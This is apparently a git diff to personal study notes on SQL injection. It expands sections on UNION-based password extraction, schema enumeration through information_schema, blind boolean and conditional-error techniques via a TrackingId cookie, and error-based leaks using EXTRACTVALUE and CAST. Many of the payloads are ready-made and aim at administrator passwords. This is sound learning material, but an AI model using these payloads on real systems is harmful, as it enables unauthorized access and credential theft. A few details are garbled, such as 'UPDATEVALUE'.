@@ -27,7 +27,7 @@ Example:
 
 `--` is a comment hence all the query after `--` is bypassed.
 
-databse will see:
+database will see:
 > SELECT * FROM users WHERE username = 'admin' *-- AND password = 'secret123'* 
 
 #### Why this suceed?
@@ -38,8 +38,7 @@ databse will see:
 ##### example:  
 string concatination:
 
-> " SELECT * FROM users WHERE username = ' " + user + " ' AND 
-password = ' " + pass + " ' ;
+> " SELECT * FROM users WHERE username = ' " + user + " ' AND password = ' " + pass + " ' ;
 
 parameterized query:
 
@@ -275,9 +274,10 @@ step:
     If no error - that column have a string values.
 
 ### SQLi UNION attack - Retrieving information  
-Step #1 - determine the number of columns.      
-Step #2 - identify the columns of string Data-type.  
-**Step #3 - retrieve interesting information**  
+Step #1 - confirm if SQl injection is possible. `(' OR 1=1--)`  
+Step #2 - determine the number of columns.      
+Step #3 - identify the columns of string Data-type.  
+**Step #4 - retrieve interesting information**  
 
 To retrieve string information from the table - you **need to know**:  
 1. **table name**
@@ -291,3 +291,348 @@ To retrieve string information from the table - you **need to know**:
 > ' UNION SELECT username, password FROM users--
 
 *All modern databases provide ways to examine the database structure, and determine what tables and columns they contain.*
+
+**Retrieving multiple values within a single column:**
+
+> ' UNION SELECT username || '~' || password FROM users--  
+
+The `||` used in oracle to concatenate string.
+
+> ' UNION SELECT CONCAT(username,'~',passoword) FROM users--  
+
+Above is the way to do same in MySQL 
+
+> ' UNION SELECT username + '~' + password FROM users--
+
+In SQL server version, above
+
+output will be like:
+> ...  
+  admin~pass123  
+  john~john123@  
+  ...  
+
+**real life example:**
+> ' UNION SELECT null, CONCAT(username, '~', password) FROM users --
+
+
+### Examining the database in SQL injection attacks:  
+
+to exploit the SQL injection vulnerabilties, its imporant to know information about database.  
+like,  
+- type / version of DB software.
+- tables / columns the DB contails. 
+
+#### How to know fatabase type and version?   
+Inject `provider-specific queries` to see if one works.
+
+##### queries to know Database version:  
+| Database type | Query |
+|:---------------|:-------|
+| microsoft, MySql | `SELECT @@version` |
+| Oracle | `SELECT * FROM v$version` |
+| PostgreSQL | `SELECT version()`|  
+
+example:
+> ' UNION SELECT @@version--
+
+
+#### List contents of the database - step #1 of database enumeration.
+
+Most database types(except oracle) have information schemas.
+
+##### Steps:   
+#1. **list tables** in the Database- query `information_schema.tables`:
+> SELECT *  
+FROM information_schema.tables  
+
+information_schema : system database  | store metadata about the DBs  
+
+output:  
+| table_catalog | table_schema | table_name | table_type|
+|:--------------|:-------------|:-------------|:------------|
+MyDatabase | app_db | users | BASE TABLE|
+MyDatabase | app_db | orders | BASE TABLE|
+MyDatabase | mysql | feedback | BASE TABLE |  
+
+#2. next query `information_schema.columns` to **list columns** in individual tables. 
+> SELECT *   
+FROM information_schema.columns   
+WHERE table_name = 'Users'
+
+output:
+| table_catalog | table_schema | table_name | column_name | data_type |
+|:--------------|:-------------|:-----------|:------------|:-----------|
+| myDatabase | app_db | users | UserId | int |
+| myDatabase | app_db | users | username | varchar |
+| myDatabase | app_db | users | Password | varchar | 
+
+
+### Blind SQL injection:
+
+Occuers when the SQLi is possible in a website   
+but its HTTP responses `don't` contain the result of the relevant SQL query   
+or details of any DB errors.
+
+**SQLi `UNION` attacks - fails | ineffective** coz it rely on the response of injected query in applications `HTTP response`.
+
+#### How to perform Blind SQLi?
+
+##### #1. trigerring conditional responses.
+cookies - used to gather analytics about app usage.  
+Request to the app include a cookie header like this:
+> Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4  
+
+when a request containing the `TrackingId`cookie is processed - app use SQL query to confirm the session(determine whether this is a known user)
+> SELECT TrackingId   
+FROM TrackedUsers   
+WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'
+
+this query is **vulnerable to SQLi** - but **result from the query is not returned** to the user - app behaves differently (SIDE CHANNEL):  
+If you submit a recognized `TrackingId`, the query `returns data `and you receive a `"Welcome back"` message in the response.  
+
+This behavior is enough to exploit the blind SQLi vulnerabilty. 
+You can retrieve information by triggering different responses conditionally, depending on an injected condition. 
+
+#### Where the vulnerability is?
+`trackingId` is directly placed inside SQL
+> WHERE TrackingId = '<USER INPUT>'
+
+we can inject the SQL inside the `cookie value`. 
+
+**Test:**  
+Replace the cookie:  
+> TrackingId = 'u5YD3PapBcR4lN3e7Tj4' AND 1=1--
+
+SQL becomes:  
+> SELECT TrackingId  
+FROM TrackedUsers   
+WHERE TrackingId = ' u5YD3PapBcR4lN3e7Tj4 **' AND 1=1--** '  
+
+`1=1` -> true   
+Query will return a row.  
+'Welcome back' appears. 
+
+Replace the cookie:
+> TrackingId = 'u5YD3PapBcR4lN3e7Tj4' AND 1=2--
+
+SQL becomes:  
+> SELECT TrackingId  
+FROM TrackerUsers  
+WHERE TrackingId = ' u5YD3PapBcR4lN3e7Tj4 **' AND 1=2--** '
+
+`1=2` -> false  
+Query return no row.  
+No 'welcome back'.
+
+**Test one character at a time**  
+Start:
+> xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Adminstrator'),1,1) > 'm  
+
+`> m` -> comparison  
+lexicographical(alphabetical) comparison  
+`a, b, c, ..., m, n, o, p, q, ...  `  
+so:  
+`'p' > 'm'` => true  
+`'a' > 'm'` => false  
+
+If first letter of the Password is greater than `m` -> true -> "welcomeback" will be returned -> 1st letter of password is > `m`
+
+**use INTRUDER (brup suite)** for recursivily doing same task (test the character at each position)
+
+Attackers use this for **BINARY SEARCH** instead of brute force.
+
+### Error Based SQLi:
+
+use of error messages to extract or infer sensitive data from the DB, even in **blind context**.
+
+The application can be indued to return a specific response based on result of a boolean expression.
+
+some application dont handle DB error properly.  
+**let DB error message **leak** into HTTP response.**
+
+#### How error is leaked?
+
+some SQL functions intentionally throw errors.  
+And that include the value being processed.
+
+> SELECT EXTRACTVALUE(1, CONCAT(0x7e, (SELECT password FROM users LIMIT 1), 0x7e));  
+
+EXTRACTVALUE -> an XML function in MySQL | used to **extract data from XML** using XPath
+
+The first arugment -> `1` is not a vaild XML.  
+MySql try to parse it.  
+guarantees an error is thrown.  
+This error will include the XPath expression (2nd argument)
+
+2nd argument -> `CONCAT(0x7e, password, 0x7e)`  
+`0x7e` - `~` tilde in hex  
+output of this concat -> `~pass123`
+
+`LIMIT 1` is used to only return 1 row from the table
+
+This will try to extract value from XML with XPath `~pass123~` which is acutally not a XPath    
+and even `1` is not a `xml_documnet`
+
+#### Common injection points:
+1. URL parameters
+2. cookies
+3. user-agent headers
+4. referer headers
+
+#### Only works when:
+1. errors are visible in HTTP response
+2. MySql DB
+3. XMl function is active. **(depricated after MySql 8.0)**
+
+#### common dev mistake to look for:
+1. database error not supressed
+2. debug mode enabled in production
+3. exceptions returned directly to users
+
+#### Error based SQLi techniques:
+
+1. **MySQL**
+    - `EXTRACTVALUE()`
+    - `UPDATEVALUE()`
+
+2.  **PostgreSQL**
+    - type caste error
+    - `to_char()` misuse
+
+3. **Orcale**
+    - `UTL_INADDR.get_host_name`
+    - `DBMS_XMLGEN`
+
+4. **SQL server**
+    - `CONVERT(int, 'text')`
+    - division by zero
+
+#### Exploiting blind SQLi by triggering conditonal errors
+
+*This technique will answer to the question "**DID THE DATABASE THROW AN ERROR?**"*
+
+##### Why this technique is needed?
+1. app does not show query results
+
+2. The application’s response does not change whether rows are returned or not → so **boolean-based blind SQLi fails**  
+
+3. app does behave differently when a database error is occured.
+
+In the trackingID of cookie:
+
+> xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END) = 'a
+
+1 != 2 -> else part is evaluated -> 'a' = 'a' -> true -> **no error -> app response normally**
+
+> xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END) ='a
+
+1 = 1 -> id part is evaluated -> 1/0 -> **divided-by-zero error -> DB error** -> app resonse change (error page/ 500/ broken response)
+
+##### Real Data Extraction payload:
+> xyz' AND  
+(SELECT CASE   
+WHEN   
+(Username = 'admin' AND SUBSTRING(Password, 1, 1) > 'm')  
+THEN 1/0  
+ELSE 'a'  
+END  
+FROM Users) = 'a 
+
+If the case condition is true -> error (divided by 0)   
+If the case condition is false -> normal resonse. 
+
+**The data leak can be done one character at a times**
+
+#### Concatenation is not required for SQL injection — it’s a workaround for strict string contexts.  
+example in ORACLE database:  
+1. subqueries must be scalar.
+2. types must match
+3. expression must be valid.
+
+##### Concatenation `||` is not requied when:
+1. injecting boolean condition.
+2. app behaviour change based on true/flase
+3. no need to return a string.
+
+##### Concatenation is requied when:
+- can't inject `AND`, `OR`, `UNION`
+
+> 'xyz'||(SELECT username FROM users WHERE ROWNUM=1)||'
+
+#### real life implemenation on a Oracle DB
+> Cookie: TrackingId=5awBmGqD8fiB1DR8'|| (SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)) ||';
+
+You can use this behavior to test whether specific entries exist in a table.  
+For example, use the following query to check whether the username administrator exists:
+> TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
+
+##### Check the length of password:
+> TrackingId=xyz' ||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'
+
+this query will check if the length of password is > than 1 
+true -> throws error 
+false -> normal resopnse.
+
+##### Check the password word by word - *use burp intruder.*
+> TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='`$a$`' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
+
+ The application returns an `HTTP 500` status code when the **error** occurs  
+ and `HTTP 200` - request was successful (ok)
+
+ ### Extracting sensitive data via verbose SQL error messages
+
+ misconfiguration of database sometimes result in **verbose** error messages.  
+  verbose - extra information
+
+ #### Key idea of this attack:
+make the DB throw error that include the Data attacker wants.  
+instead of asking ***"is this condition true?"***   
+you for the database to say `"I tried to convert this value and failed"`
+
+#### use of CAST():
+convert one datatype into another.  
+
+example:
+> CAST('123' AS int) // no error | works  
+> CAST('abc' AS int) // error | cant typecast
+
+error: 
+> invalid input syntax for type integer: "abc"
+
+String value appear inside of the error.
+
+#### How attacker will exploit it ?
+> CAST((SELECT password FROM users WHERE username='admin') AS int)
+
+error:
+> ERROR: invalid input syntax for type integer: "s3cr3t"
+
+Password is leaked.
+
+#### When it will work?
+1. DB error is not suppressed.
+2. error messages are returned to client.
+3. Db include failing value in the error.
+
+### character-limit note matters
+
+Sometime app limit characters. like:  
+- cookies max 30-40 characters
+- URL parameter length restrictions
+- input filed truncated.
+
+**PAYLOAD length limitation in most of the blind SQLi**  
+example:
+> CASE WHEN SUBSTRING(password,1,1)='a' THEN 1/0 ELSE 1 END
+
+payload is lengthy, more keywords, etc  
+`attack can fail` as payload get cut, query breaks, etc.
+
+### `CAST()` to the rescue
+
+Small payload  
+no `case` 
+No  `substring`  
+No loops/comparisons  
+direct error is thrown.
